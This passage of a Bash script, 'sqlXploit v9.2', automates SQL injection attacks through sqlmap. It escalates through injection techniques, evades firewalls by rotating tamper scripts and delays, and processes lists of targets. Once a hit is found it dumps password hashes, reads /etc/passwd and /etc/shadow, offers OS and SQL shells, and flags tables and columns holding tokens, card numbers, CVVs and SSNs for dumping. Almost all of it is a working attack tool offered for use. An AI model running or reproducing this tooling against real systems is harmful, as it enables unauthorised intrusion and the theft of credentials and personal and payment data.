    [[ "$DETECTED_TECHNIQUE" != *T* ]] && [[ "$DETECTED_TECHNIQUE" != *B* && "$DETECTED_TECHNIQUE" != *E* ]] && \
      DETECTED_TECHNIQUE="BE${DETECTED_TECHNIQUE}"
    auto "Detected techniques: ${DETECTED_TECHNIQUE}"
  fi

  echo "TECHNIQUE=${DETECTED_TECHNIQUE}" >> "$INTEL_FILE"
}

# ═══════════════════════════════════════════════════════════════
#  BUILD SQLMAP COMMAND
# ═══════════════════════════════════════════════════════════════
build_sqlmap_cmd() {
  local -n _arr="$1"
  local url_arg="$2" technique="$3" \
        level="${4:-$SQLMAP_LEVEL}" \
        risk="${5:-$SQLMAP_RISK}" \
        ts="${6:-$TIME_SEC}"

  _arr=(
    sqlmap
    "--technique=${technique}"
    "--level=${level}"
    "--risk=${risk}"
    "--threads=${CURRENT_THREADS}"
    "--timeout=15"
    "--retries=2"
    "--time-sec=${ts}"
    --batch
    --random-agent
    --smart
  )

  # Union col hint if pre-detected
  if (( UNION_COLS > 0 )); then
    _arr+=( "--union-cols=${UNION_COLS}" )
  fi

  [[ "$url_arg" == -r* ]] && _arr+=( $url_arg ) || _arr+=( -u "$url_arg" )

  [[ -n "${COOKIE_OPT:-}" ]] && _arr+=( "${COOKIE_OPT}" )
  [[ -n "${HEADER_OPT:-}" ]] && _arr+=( "${HEADER_OPT}" )
  [[ -n "${PROXY_OPT:-}"  ]] && _arr+=( "${PROXY_OPT}"  )
  [[ -n "${CURRENT_TAMPER:-}" ]] && _arr+=( "--tamper=${CURRENT_TAMPER}" )
  (( CURRENT_DELAY > 0 ))        && _arr+=( "--delay=${CURRENT_DELAY}" )
}

# ═══════════════════════════════════════════════════════════════
#  PARSERS
# ═══════════════════════════════════════════════════════════════
parse_injection_found() {
  echo "$1" | grep -qiE \
    "parameter '.*' is vulnerable|Type: (boolean|time|error|union|stacked|inline)|back-end DBMS:|injectable|sqlinjection confirmed|GET.*parameter.*is injectable|POST.*parameter.*is injectable"
}

parse_blocked() {
  echo "$1" | grep -qiE \
    "connection refused|403 forbidden|heuristic.*detected|too many requests|waf|firewall|rate.limit"
}

extract_sqli_type() {
  local out="$1"
  if echo "$out" | grep -qiE "Type: UNION query";    then SQLI_TYPE="UNION";   return; fi
  if echo "$out" | grep -qiE "Type: error-based";    then SQLI_TYPE="ERROR";   return; fi
  if echo "$out" | grep -qiE "Type: boolean-based";  then SQLI_TYPE="BOOLEAN"; return; fi
  if echo "$out" | grep -qiE "Type: time-based";     then SQLI_TYPE="TIME";    return; fi
  if echo "$out" | grep -qiE "Type: stacked queries";then SQLI_TYPE="STACKED"; return; fi
  if echo "$out" | grep -qiE "Type: inline query";   then SQLI_TYPE="INLINE";  return; fi
  SQLI_TYPE="UNKNOWN"
}

# ═══════════════════════════════════════════════════════════════
#  BLOCK HANDLER
# ═══════════════════════════════════════════════════════════════
handle_block() {
  local reason="$1"
  ((BLOCK_COUNT++)) || true
  adapt "BLOCK #${BLOCK_COUNT} — ${reason}"
  echo "BLOCK #${BLOCK_COUNT}: ${reason}" >> "$BLOCK_LOG"
  (( BLOCK_COUNT >= MAX_BLOCK_RETRIES )) && \
    warn "Max retries reached — skipping phase" && return 1
  local nd=$(( CURRENT_DELAY + 3 ))
  (( nd > 10 )) && nd=10
  CURRENT_DELAY=$nd
  CURRENT_THREADS=1
  TAMPER_INDEX=$(( (TAMPER_INDEX + 1) % ${#TAMPER_POOL[@]} ))
  CURRENT_TAMPER="${TAMPER_POOL[$TAMPER_INDEX]}"
  adapt "→ delay=${CURRENT_DELAY}s | tamper=${CURRENT_TAMPER}"
  sleep $(( CURRENT_DELAY + 1 ))
  return 0
}

# ═══════════════════════════════════════════════════════════════
#  ADAPTIVE SCAN — UNION-FIRST ORDER
#
#  Phase 1: UNION only, level 1 — fastest, most data
#  Phase 2: UNION+ERROR, level 2 — error-based fallback
#  Phase 3: UNION+ERROR+BOOL, level 3 — blind fallback
#  Phase 4: TIME+STACKED, level 3 — last resort
#  Phase 5: OOB (if domain configured)
# ═══════════════════════════════════════════════════════════════
adaptive_scan() {
  local url_arg="$1" probe_url="$2"
  SQLI_FOUND=false
  SQLI_TYPE=""

  local ts=$(( BASELINE_TIME / 1000 + TIME_SEC ))
  (( ts < TIME_SEC )) && ts=$TIME_SEC
  (( ts > 20 ))       && ts=20

  # Run prescan + header injection check in parallel
  prescan_technique         "$probe_url" &
  local prescan_pid=$!
  test_header_injection_fast "$probe_url" &
  local header_pid=$!
  wait $prescan_pid; wait $header_pid

  local tech="${DETECTED_TECHNIQUE:-U}"

  # ─── Phase 1: UNION ONLY (fastest, richest data) ───────────
  sep
  spd "${BOLD}Phase 1 — UNION-based SQLi (fastest) | level:1${NC}"
  local cmd1=()
  # Force UNION first regardless of pre-scan
  build_sqlmap_cmd cmd1 "$url_arg" "U" 1 1 "$ts"

  local out1 out1_all
  out1=$(timeout "$SQLI_TIMEOUT" "${cmd1[@]}" </dev/null 2>&1 | sanitize_output) || true
  echo "$out1" | tee -a "$LOG_FILE"
  out1_all="$out1"

  if parse_blocked "$out1"; then
    handle_block "Phase1-UNION" && {
      local cmd1r=(); build_sqlmap_cmd cmd1r "$url_arg" "U" 1 1 "$ts"
      local r; r=$(timeout "$SQLI_TIMEOUT" "${cmd1r[@]}" </dev/null 2>&1 | sanitize_output) || true
      echo "$r" | tee -a "$LOG_FILE"; out1_all+=$'\n'"$r"
    }
  fi

  if parse_injection_found "$out1_all"; then
    SQLI_FOUND=true; extract_sqli_type "$out1_all"
    hit "SQLi FOUND — Phase 1 (UNION)! Type: ${SQLI_TYPE}"
    echo "[SQLI_CONFIRMED:UNION] ${probe_url}" >> "$HITS_FILE"
    return
  fi

  # Check budget
  local used; used=$(elapsed_since_start)
  (( used > SQLI_TIMEOUT * 9 / 10 )) && warn "Budget limit — stopping at Phase 1" && return

  # ─── Phase 2: ERROR-BASED ───────────────────────────────────
  sep
  spd "${BOLD}Phase 2 — Error-based SQLi | level:2${NC}"
  local cmd2=(); build_sqlmap_cmd cmd2 "$url_arg" "E" 2 1 "$ts"

  local out2 out2_all
  out2=$(timeout "$SQLI_TIMEOUT" "${cmd2[@]}" </dev/null 2>&1 | sanitize_output) || true
  echo "$out2" | tee -a "$LOG_FILE"; out2_all="$out2"

  if parse_blocked "$out2"; then
    handle_block "Phase2-ERROR" && {
      local cmd2r=(); build_sqlmap_cmd cmd2r "$url_arg" "E" 2 1 "$ts"
      local r; r=$(timeout "$SQLI_TIMEOUT" "${cmd2r[@]}" </dev/null 2>&1 | sanitize_output) || true
      echo "$r" | tee -a "$LOG_FILE"; out2_all+=$'\n'"$r"
    }
  fi

  if parse_injection_found "$out2_all"; then
    SQLI_FOUND=true; extract_sqli_type "$out2_all"
    hit "SQLi FOUND — Phase 2 (ERROR)! Type: ${SQLI_TYPE}"
    echo "[SQLI_CONFIRMED:ERROR] ${probe_url}" >> "$HITS_FILE"
    return
  fi

  used=$(elapsed_since_start)
  (( used > SQLI_TIMEOUT * 9 / 10 )) && warn "Budget limit — stopping at Phase 2" && return

  # ─── Phase 3: BOOLEAN BLIND ─────────────────────────────────
  sep
  spd "${BOLD}Phase 3 — Boolean-blind SQLi | level:3${NC}"
  local cmd3=(); build_sqlmap_cmd cmd3 "$url_arg" "B" 3 2 "$ts"

  local out3 out3_all
  out3=$(timeout "$SQLI_TIMEOUT" "${cmd3[@]}" </dev/null 2>&1 | sanitize_output) || true
  echo "$out3" | tee -a "$LOG_FILE"; out3_all="$out3"

  if parse_blocked "$out3"; then
    handle_block "Phase3-BOOL" && {
      local cmd3r=(); build_sqlmap_cmd cmd3r "$url_arg" "B" 3 2 "$ts"
      local r; r=$(timeout "$SQLI_TIMEOUT" "${cmd3r[@]}" </dev/null 2>&1 | sanitize_output) || true
      echo "$r" | tee -a "$LOG_FILE"; out3_all+=$'\n'"$r"
    }
  fi

  if parse_injection_found "$out3_all"; then
    SQLI_FOUND=true; extract_sqli_type "$out3_all"
    hit "SQLi FOUND — Phase 3 (BOOLEAN)! Type: ${SQLI_TYPE}"
    echo "[SQLI_CONFIRMED:BOOLEAN] ${probe_url}" >> "$HITS_FILE"
    return
  fi

  used=$(elapsed_since_start)
  (( used > SQLI_TIMEOUT * 9 / 10 )) && warn "Budget limit — stopping at Phase 3" && return

  # ─── Phase 4: TIME-BASED + STACKED ──────────────────────────
  if $DO_TIME_BASED; then
    sep
    spd "${BOLD}Phase 4 — Time-based blind + Stacked | level:3${NC}"
    local cmd4=(); build_sqlmap_cmd cmd4 "$url_arg" "TS" 3 2 "$ts"

    local out4 out4_all
    out4=$(timeout "$SQLI_TIMEOUT" "${cmd4[@]}" </dev/null 2>&1 | sanitize_output) || true
    echo "$out4" | tee -a "$LOG_FILE"; out4_all="$out4"

    if parse_blocked "$out4"; then
      handle_block "Phase4-TIME" && {
        local cmd4r=(); build_sqlmap_cmd cmd4r "$url_arg" "TS" 3 2 "$ts"
        local r; r=$(timeout "$SQLI_TIMEOUT" "${cmd4r[@]}" </dev/null 2>&1 | sanitize_output) || true
        echo "$r" | tee -a "$LOG_FILE"; out4_all+=$'\n'"$r"
      }
    fi

    if parse_injection_found "$out4_all"; then
      SQLI_FOUND=true; extract_sqli_type "$out4_all"
      hit "SQLi FOUND — Phase 4 (TIME/STACKED)! Type: ${SQLI_TYPE}"
      echo "[SQLI_CONFIRMED:TIME_STACKED] ${probe_url}" >> "$HITS_FILE"
      return
    fi
  fi

  used=$(elapsed_since_start)
  (( used > SQLI_TIMEOUT * 9 / 10 )) && return

  # ─── Phase 5: Full combined BEUST fallback ──────────────────
  sep
  spd "${BOLD}Phase 5 — Full BEUST combined (wide net) | level:${SQLMAP_LEVEL}${NC}"
  local cmd5=(); build_sqlmap_cmd cmd5 "$url_arg" "BEUST" "$SQLMAP_LEVEL" "$SQLMAP_RISK" "$ts"

  local out5
  out5=$(timeout "$SQLI_TIMEOUT" "${cmd5[@]}" </dev/null 2>&1 | sanitize_output) || true
  echo "$out5" | tee -a "$LOG_FILE"

  if parse_injection_found "$out5"; then
    SQLI_FOUND=true; extract_sqli_type "$out5"
    hit "SQLi FOUND — Phase 5 (BEUST)! Type: ${SQLI_TYPE}"
    echo "[SQLI_CONFIRMED:BEUST] ${probe_url}" >> "$HITS_FILE"
    return
  fi

  # ─── Phase 6: OOB ───────────────────────────────────────────
  if $DO_OOB && [[ "$OOB_ENABLED" == "true" ]]; then
    sep
    spd "${BOLD}Phase 6 — Out-of-Band (OOB) SQLi${NC}"
    probe_oob "$probe_url" && {
      SQLI_FOUND=true; SQLI_TYPE="OOB"
      hit "SQLi FOUND — Phase 6 (OOB)!"
      return
    }
  fi

  # Also check if manual UNION probe already found something
  if (( UNION_COLS > 0 )) && grep -q "MANUAL_UNION" "$HITS_FILE" 2>/dev/null; then
    SQLI_FOUND=true; SQLI_TYPE="UNION"
    hit "SQLi confirmed from manual UNION probe!"
  fi
}

# ═══════════════════════════════════════════════════════════════
#  PRIVILEGE & DBA ENUMERATION
#  Full privilege tree: user, role, grants, file_priv, super
# ═══════════════════════════════════════════════════════════════
enumerate_privileges() {
  local base_arr=( "$@" )
  sep
  priv "Full Privilege Enumeration..."

  # 1. Current user + DBA check
  local info_out
  info_out=$( "${base_arr[@]}" --current-db --current-user --is-dba --hostname </dev/null 2>&1 | sanitize_output ) || true
  echo "$info_out" | tee -a "$LOG_FILE"

  local cur_db cur_user is_dba hostname
  cur_db=$(  echo "$info_out" | grep -oP "(?i)current database:\s*'?\K[^'\s]+"  | head -1 || echo "")
  cur_user=$(echo "$info_out" | grep -oP "(?i)current user:\s*'?\K[^'\s]+"      | head -1 || echo "")
  is_dba=$(  echo "$info_out" | grep -oiP "(?i)is-dba.*\K(True|False)"          | head -1 || echo "unknown")
  hostname=$(echo "$info_out" | grep -oP "(?i)web server operating system:\s*\K.*" | head -1 || echo "unknown")

  log ""
  log "  ${R}${BOLD}┌─ PRIVILEGE REPORT ─────────────────────────┐${NC}"
  log "  ${R}│${NC}  DB      : ${G}${cur_db:-?}${NC}"
  log "  ${R}│${NC}  User    : ${G}${cur_user:-?}${NC}"
  log "  ${R}│${NC}  DBA     : ${R}${BOLD}${is_dba}${NC}"
  log "  ${R}│${NC}  Host OS : ${Y}${hostname}${NC}"
  log "  ${R}└────────────────────────────────────────────┘${NC}"

  echo "[INFO] DB=${cur_db} User=${cur_user} DBA=${is_dba} OS=${hostname}" >> "$HITS_FILE"
  echo "DB=${cur_db}" >> "$PRIV_LOG"
  echo "USER=${cur_user}" >> "$PRIV_LOG"
  echo "DBA=${is_dba}" >> "$PRIV_LOG"
  echo "HOSTNAME=${hostname}" >> "$PRIV_LOG"

  # 2. All privileges
  step "Fetching all user privileges..."
  local priv_out
  priv_out=$( "${base_arr[@]}" --privileges </dev/null 2>&1 | sanitize_output ) || true
  echo "$priv_out" | tee -a "$LOG_FILE"
  echo "$priv_out" >> "$PRIV_LOG"

  # Parse FILE privilege (critical for reading files / writing webshells)
  if echo "$priv_out" | grep -qiE "FILE|FILE_PRIV|SUPER"; then
    priv "FILE/SUPER privilege detected — can read/write files!"
    echo "FILE_PRIV_CONFIRMED" >> "$PRIV_LOG"
    echo "[PRIV] FILE privilege: ${cur_user}" >> "$HITS_FILE"
  fi

  # 3. All user roles (MySQL 8+)
  step "Fetching all DB users + roles..."
  local roles_out
  roles_out=$( "${base_arr[@]}" --users --roles </dev/null 2>&1 | sanitize_output ) || true
  echo "$roles_out" | tee -a "$LOG_FILE"
  echo "$roles_out" >> "$PRIV_LOG"

  # 4. DBA-specific actions
  if echo "$is_dba" | grep -qi "true"; then
    priv "${BOLD}DBA CONFIRMED — escalating...${NC}"
    echo "[DBA_CONFIRMED] ${cur_user}" >> "$HITS_FILE"

    # Dump password hashes
    iask_yn "  Dump all users + password hashes?" && {
      local pw_out
      pw_out=$( "${base_arr[@]}" --users --passwords </dev/null 2>&1 | sanitize_output ) || true
      echo "$pw_out" | tee -a "$LOG_FILE"
      echo "$pw_out" > "${DUMP_DIR}/users_and_hashes.txt"
      echo "[DUMPED] users_and_hashes" >> "$HITS_FILE"
      ok "Password hashes saved → ${DUMP_DIR}/users_and_hashes.txt"
    }

    # Read sensitive files (if FILE priv)
    if echo "$priv_out" | grep -qiE "FILE_PRIV|FILE|SUPER"; then
      iask_yn "  Try reading /etc/passwd via LOAD_FILE?" && {
        local file_out
        file_out=$( "${base_arr[@]}" --file-read=/etc/passwd </dev/null 2>&1 | sanitize_output ) || true
        echo "$file_out" | tee -a "$LOG_FILE"
        echo "$file_out" > "${DUMP_DIR}/etc_passwd.txt"
        ok "File read saved → ${DUMP_DIR}/etc_passwd.txt"
        echo "[FILE_READ] /etc/passwd" >> "$HITS_FILE"
      }

      iask_yn "  Try reading /etc/shadow (root only)?" && {
        local shadow_out
        shadow_out=$( "${base_arr[@]}" --file-read=/etc/shadow </dev/null 2>&1 | sanitize_output ) || true
        echo "$shadow_out" | tee -a "$LOG_FILE"
        echo "$shadow_out" > "${DUMP_DIR}/etc_shadow.txt"
        echo "[FILE_READ] /etc/shadow" >> "$HITS_FILE"
      }
    fi

    # OS shell attempt
    iask_yn "  Attempt OS command execution (--os-shell)?" "n" && {
      priv "Launching OS shell (--os-shell)..."
      "${base_arr[@]}" --os-shell </dev/tty
      echo "[OS_SHELL] attempted" >> "$HITS_FILE"
    }

    # SQL shell
    iask_yn "  Open SQL shell (--sql-shell)?" "n" && {
      priv "Launching SQL shell..."
      "${base_arr[@]}" --sql-shell </dev/tty
    }
  fi

  # Return values for later use
  echo "$cur_db"
}

# ═══════════════════════════════════════════════════════════════
#  INTERACTIVE GUIDED DUMP (unchanged logic, improved privilege)
# ═══════════════════════════════════════════════════════════════
interactive_dump() {
  local url_arg="$1" label="$2"
  sep; hit "INJECTION CONFIRMED — ${label} [Type: ${SQLI_TYPE:-UNKNOWN}]"; sep

  local ts=$(( BASELINE_TIME / 1000 + TIME_SEC ))
  (( ts < TIME_SEC )) && ts=$TIME_SEC
  (( ts > 20 ))       && ts=20

  # Use the most capable technique for dumping
  local dump_tech="BEUST"
  [[ "$SQLI_TYPE" == "UNION" ]]   && dump_tech="U"
  [[ "$SQLI_TYPE" == "ERROR" ]]   && dump_tech="E"
  [[ "$SQLI_TYPE" == "BOOLEAN" ]] && dump_tech="B"
  [[ "$SQLI_TYPE" == "TIME" ]]    && dump_tech="T"
  [[ "$SQLI_TYPE" == "STACKED" ]] && dump_tech="S"

  local base_arr=()
  build_sqlmap_cmd base_arr "$url_arg" "$dump_tech" 3 2 "$ts"

  # Full privilege enumeration (returns cur_db)
  local cur_db
  cur_db=$(enumerate_privileges "${base_arr[@]}")

  sep
  iask_yn "List all databases?" "y" || {
    [[ -n "$cur_db" ]] && _dump_db "$url_arg" "$label" "$cur_db" "${base_arr[@]}" \
                       || err "No DB found."
    return
  }

  step "Enumerating databases..."
  local dbs_out
  dbs_out=$( "${base_arr[@]}" --dbs </dev/null 2>&1 | sanitize_output ) || true
  echo "$dbs_out" | tee -a "$LOG_FILE"

  local db_list=()
  local in_db_section=false
  while IFS= read -r line; do
    echo "$line" | grep -qi "available databases" && in_db_section=true
    $in_db_section || continue
    echo "$line" | grep -qP '^\[\*\]\s+\S+' || continue
    echo "$line" | grep -qP '^\[\*\]\s+\S+.*@\s*\d{2}:\d{2}' && continue
    echo "$line" | grep -qP '^\[\*\]\s+starting' && continue
    local dn
    dn=$(echo "$line" | grep -oP '(?<=\[\*\]\s)\S+' | head -1)
    [[ -n "$dn" ]] && db_list+=("$dn")
  done <<< "$dbs_out"

  (( ${#db_list[@]} == 0 )) && [[ -n "$cur_db" ]] && db_list+=("$cur_db")
  (( ${#db_list[@]} == 0 )) && { err "No databases found."; return; }

  local skip_p="^(information_schema|performance_schema|mysql|sys|pg_catalog|template0|template1)$"
  local user_dbs=()
  for db in "${db_list[@]}"; do
    echo "$db" | grep -qiE "$skip_p" || user_dbs+=("$db")
  done
  log "  ${C}User DBs:${NC} ${user_dbs[*]:-none}"

  local chosen=()
  if (( ${#user_dbs[@]} == 1 )); then
    chosen=( "${user_dbs[0]}" )
  elif (( ${#user_dbs[@]} > 1 )); then
    log "  ${G}0${NC}) ALL"
    local idx=1
    for db in "${user_dbs[@]}"; do log "  ${G}${idx}${NC}) ${db}"; ((idx++)) || true; done
    local ch; ch=$(iask "  Choice [0=all]: " "0")
    if [[ "$ch" == "0" ]]; then
      chosen=( "${user_dbs[@]}" )
    else
      IFS=',' read -ra ns <<< "$ch"
      for n in "${ns[@]}"; do
        n=$(echo "$n" | tr -d ' ')
        (( n >= 1 && n <= ${#user_dbs[@]} )) && chosen+=( "${user_dbs[$((n-1))]}" )
      done
      (( ${#chosen[@]} == 0 )) && chosen=( "${user_dbs[@]}" )
    fi
  fi

  for db in "${chosen[@]}"; do
    _dump_db "$url_arg" "$label" "$db" "${base_arr[@]}"
  done
  sep; ok "Dump complete → ${DUMP_DIR}/"
}

_dump_db() {
  local url_arg="$1" label="$2" db="$3"; shift 3
  local base_arr=( "$@" )
  sep; log "${C}${BOLD}  DB: ${db}${NC}"
  iask_yn "  List tables in '${db}'?" "y" || { info "Skipping ${db}"; return; }

  step "Tables in ${db}..."
  local tout
  tout=$( "${base_arr[@]}" -D "$db" --tables </dev/null 2>&1 | sanitize_output ) || true
  echo "$tout" | tee -a "$LOG_FILE"

  local tlist=()
  while IFS= read -r line; do
    echo "$line" | grep -qP '^\|\s+\S+\s+\|' && \
      tlist+=( "$(echo "$line" | grep -oP '(?<=\|\s)\S+(?=\s+\|)' | head -1)" )
  done <<< "$tout"
  (( ${#tlist[@]} == 0 )) && { warn "No tables in ${db}"; return; }

  local idx=1
  for tb in "${tlist[@]}"; do
    local f=""
    echo "$tb" | grep -qiE "user|admin|pass|cred|customer|email|token|secret|auth|payment|card|order|session|config|key" \
      && f=" ${R}★${NC}"
    log "  ${G}${idx}${NC}) ${tb}${f}"
    ((idx++)) || true
  done

  iask_yn "  Dump tables from '${db}'?" "y" || { info "Skipping"; return; }
  log "  ${G}0${NC}) ALL  or numbers/names comma-separated"
  local ch; ch=$(iask "  Choice: " "0")

  local chosen=()
  if [[ "$ch" == "0" ]]; then
    chosen=( "${tlist[@]}" )
  elif echo "$ch" | grep -qP '^\d+(,\d+)*$'; then
    IFS=',' read -ra ns <<< "$ch"
    for n in "${ns[@]}"; do
      n=$(echo "$n" | tr -d ' ')
      (( n >= 1 && n <= ${#tlist[@]} )) && chosen+=( "${tlist[$((n-1))]}" )
    done
  else
    IFS=',' read -ra nms <<< "$ch"
    for nm in "${nms[@]}"; do
      nm=$(echo "$nm" | tr -d ' '); [[ -n "$nm" ]] && chosen+=("$nm")
    done
  fi
  (( ${#chosen[@]} == 0 )) && chosen=( "${tlist[@]}" )

  for tb in "${chosen[@]}"; do
    [[ -z "$tb" ]] && continue
    _dump_table "$url_arg" "$label" "$db" "$tb" "${base_arr[@]}"
  done
}

_dump_table() {
  local url_arg="$1" label="$2" db="$3" tb="$4"; shift 4
  local base_arr=( "$@" )
  sep; log "${C}${BOLD}  TABLE: ${db}.${tb}${NC}"

  step "Columns in ${db}.${tb}..."
  local cout
  cout=$( "${base_arr[@]}" -D "$db" -T "$tb" --columns </dev/null 2>&1 | sanitize_output ) || true
  echo "$cout" | tee -a "$LOG_FILE"

  local col_names=()
  while IFS= read -r line; do
    echo "$line" | grep -qP '^\|\s+\w+\s+\|' || continue
    local cn; cn=$(echo "$line" | awk -F'|' '{gsub(/[[:space:]]/,"",$2); print $2}')
    [[ -n "$cn" && "$cn" != "Column" && "$cn" != "-" ]] && col_names+=("$cn")
  done <<< "$cout"

  if (( ${#col_names[@]} > 0 )); then
    local ci=1
    for cn in "${col_names[@]}"; do
      local cf=""
      echo "$cn" | grep -qiE "pass|secret|token|key|hash|credit|card|cvv|ssn|salary|balance|otp|pin" \
        && cf=" ${R}★${NC}"
      log "  ${G}${ci}${NC}) ${cn}${cf}"
      ((ci++)) || true
    done
  fi

  local col_flag=""
  if (( ${#col_names[@]} > 0 )) && iask_yn "  Specific columns only?"; then
    local cc; cc=$(iask "  Col numbers/names: " "")
    if [[ -n "$cc" ]]; then
      local chosen_c=()
      if echo "$cc" | grep -qP '^\d+(,\d+)*$'; then
        IFS=',' read -ra ns <<< "$cc"
        for n in "${ns[@]}"; do
          n=$(echo "$n" | tr -d ' ')
          (( n >= 1 && n <= ${#col_names[@]} )) && chosen_c+=( "${col_names[$((n-1))]}" )
        done
      else
        IFS=',' read -ra nms <<< "$cc"
        for nm in "${nms[@]}"; do
          nm=$(echo "$nm" | tr -d ' '); [[ -n "$nm" ]] && chosen_c+=("$nm")
        done
      fi
      (( ${#chosen_c[@]} > 0 )) && col_flag="-C $(IFS=','; echo "${chosen_c[*]}")"
    fi
  fi

  local start_flag="" stop_flag=""
  local cnt_out cnt_val
  cnt_out=$( "${base_arr[@]}" -D "$db" -T "$tb" --count </dev/null 2>&1 | sanitize_output ) || true
  cnt_val=$(echo "$cnt_out" | grep -oP '\|\s*\K\d+(?=\s*\|)' | grep -v '^0$' | head -1 || echo "?")
  log "  ${Y}Row count: ${cnt_val}${NC}"

  if [[ "$cnt_val" =~ ^[0-9]+$ ]] && (( cnt_val > 500 )); then
    warn "  Large table: ${cnt_val} rows"
    log "  ${G}1${NC}) First 500  ${G}2${NC}) First 1000  ${G}3${NC}) Custom  ${G}4${NC}) ALL"
    local lc; lc=$(iask "  Limit [1]: " "1")
    case "$lc" in
      1) start_flag="--start=0"; stop_flag="--stop=500"   ;;
      2) start_flag="--start=0"; stop_flag="--stop=1000"  ;;
      3) local rs re
         rs=$(iask "  Start row: " "0"); re=$(iask "  Stop row: " "100")
         start_flag="--start=${rs}"; stop_flag="--stop=${re}" ;;
    esac
  fi

  iask_yn "  Dump ${db}.${tb}?" "y" || { info "Skipping"; return; }

  local dcmd=( "${base_arr[@]}" -D "$db" -T "$tb" --dump )
  [[ -n "$col_flag"   ]] && dcmd+=( $col_flag )
  [[ -n "$start_flag" ]] && dcmd+=( "$start_flag" )
  [[ -n "$stop_flag"  ]] && dcmd+=( "$stop_flag" )

  step "Dumping ${db}.${tb}..."
  local dout
  dout=$( "${dcmd[@]}" </dev/null 2>&1 | sanitize_output ) || true
  echo "$dout" | tee -a "$LOG_FILE"

  local sf; sf=$(echo "${tb}" | tr '/' '_')
  echo "$dout" > "${DUMP_DIR}/${db}_${sf}.txt"
  ok "Saved → ${DUMP_DIR}/${db}_${sf}.txt"
  echo "[DUMPED] ${label} → ${db}.${tb}" >> "$HITS_FILE"

  iask_yn "  Export as CSV?" && {
    local cdout
    cdout=$( "${dcmd[@]}" --dump-format=CSV </dev/null 2>&1 | sanitize_output ) || true
    echo "$cdout" > "${DUMP_DIR}/${db}_${sf}.csv"
    ok "CSV → ${DUMP_DIR}/${db}_${sf}.csv"
  }
  sleep "${CURRENT_DELAY:-0}"
}

# ═══════════════════════════════════════════════════════════════
#  PROCESS TARGET — includes smart ID variant probing
# ═══════════════════════════════════════════════════════════════
process_target() {
  local url_arg="$1" label="$2" probe_url="$3"

  BLOCK_COUNT=0
  CURRENT_THREADS=$SQLMAP_THREADS
  TAMPER_INDEX=0
  CURRENT_TAMPER=""
  CURRENT_DELAY=0
  WAF_NAME=""
  DETECTED_TECHNIQUE=""
  SQLI_FOUND=false
  SQLI_TYPE=""
  UNION_COLS=0
  UNION_REFLECT_COL=0

  sep
  log "${G}${BOLD}TARGET: ${label}${NC}"
  log "${DIM}  Mode: ${MODE_NAME} | $(date '+%H:%M:%S')${NC}"
  sep

  local T0; T0=$(date +%s)

  capture_baseline   "$probe_url"
  fingerprint_target "$probe_url"

  # Smart ID variants — try each as probe to see if different behavior
  local id_variants=()
  get_smart_id_variants "$probe_url" id_variants

  if (( ${#id_variants[@]} > 0 )); then
    info "Smart ID variants: testing ${#id_variants[@]} alternate param values..."
    local best_url="$probe_url"
    local best_diff=0
    local orig_body; orig_body=$(do_curl "$probe_url")

    local v
    for v in "${id_variants[@]}"; do
      local vbody; vbody=$(do_curl "$v" 2>/dev/null || echo "")
      local vdiff=$(( ${#orig_body} > ${#vbody} ? ${#orig_body} - ${#vbody} : ${#vbody} - ${#orig_body} ))
      if (( vdiff > best_diff )); then
        best_diff=$vdiff
        best_url="$v"
      fi
      # If response is clearly empty/error for negative ID — use it for UNION (no original row)
      if (( ${#vbody} < ${#orig_body} * 30 / 100 && ${#orig_body} > 200 )); then
        intel "Smart ID: negative/zero ID returns empty → good UNION base: ${v}"
        best_url="$v"
        break
      fi
    done

    if [[ "$best_url" != "$probe_url" ]]; then
      intel "Using smart ID variant for scan: ${best_url}"
      echo "SMART_ID_VARIANT=${best_url}" >> "$INTEL_FILE"
      probe_url="$best_url"
      [[ "$url_arg" == "$1" ]] && url_arg="$best_url"
    fi
  fi

  sep; info "${BOLD}▶ SQLi SCAN — UNION-FIRST ORDER${NC}"
  adaptive_scan "$url_arg" "$probe_url"
  timer "Elapsed: $(( $(date +%s) - T0 ))s"

  $SQLI_FOUND && interactive_dump "$url_arg" "$label"

  local elapsed=$(( $(date +%s) - T0 ))
  sep
  ok "Done in ${elapsed}s ($(( elapsed / 60 ))m $(( elapsed % 60 ))s)"
  sep
  sleep "${CURRENT_DELAY:-0}"
}

# ═══════════════════════════════════════════════════════════════
#  DISPATCH
# ═══════════════════════════════════════════════════════════════
sep
log "\n${G}${BOLD}⚡ sqlXploit v9.2 — ${MODE_NAME}${NC}"
log "   Output: ${Y}${LOG_DIR}/${NC}\n"
sep

if [[ -n "$burp_file" ]]; then
  probe_url=$(grep -m1 -oP 'https?://[^ \r\n]+' "$burp_file" 2>/dev/null || echo "")
  [[ -z "$probe_url" ]] && { err "Cannot extract URL from Burp file."; exit 1; }
  process_target "-r ${burp_file}" "BurpFile:${burp_file}" "$probe_url"
elif [[ -n "$targets_file" ]]; then
  total=$(wc -l < "$targets_file"); cur=0
  while IFS= read -r target; do
    [[ -z "$target" ]] && continue
    ((cur++)) || true
    sep; info "[${cur}/${total}] ${target}"
    process_target "$target" "$target" "$target"
  done < "$targets_file"
else
  process_target "$input_url" "$input_url" "$input_url"
fi

# ═══════════════════════════════════════════════════════════════
#  FINAL REPORT
# ═══════════════════════════════════════════════════════════════
banner; sep
log "${G}${BOLD}  SCAN COMPLETE — sqlXploit v9.2${NC}"; sep

total_time=$(( $(date +%s) - SCAN_START ))
total_sqli=0; total_dumped=0; total_blks=0; total_oob=0; total_priv=0

if [[ -s "$HITS_FILE" ]]; then
  _t=$(grep -cE "SQLI_CONFIRMED|MANUAL_UNION|injectable" "$HITS_FILE" 2>/dev/null || true);  total_sqli=$(( ${_t:-0} ))
  _t=$(grep -c "DUMPED" "$HITS_FILE" 2>/dev/null || true);                                   total_dumped=$(( ${_t:-0} ))
  _t=$(grep -c "OOB_.*CONFIRMED" "$HITS_FILE" 2>/dev/null || true);                          total_oob=$(( ${_t:-0} ))
  _t=$(grep -c "DBA_CONFIRMED\|FILE_READ\|PRIV" "$HITS_FILE" 2>/dev/null || true);           total_priv=$(( ${_t:-0} ))
fi
if [[ -s "$BLOCK_LOG" ]]; then
  _t=$(wc -l < "$BLOCK_LOG" 2>/dev/null || true); total_blks=$(( ${_t:-0} ))
fi

total_hits=$(( total_sqli + total_dumped + total_oob ))

log "  ${C}Mode          :${NC} ${MODE_NAME}"
log "  ${C}Total time    :${NC} ${total_time}s ($(( total_time / 60 ))m $(( total_time % 60 ))s)"
log "  ${C}Output        :${NC} ${LOG_DIR}/"
log "  ${Y}Blocks hit    :${NC} ${total_blks}"
log "  ${R}SQLi findings :${NC} ${total_sqli}"
log "  ${R}OOB confirmed :${NC} ${total_oob}"
log "  ${R}Priv findings :${NC} ${total_priv}"
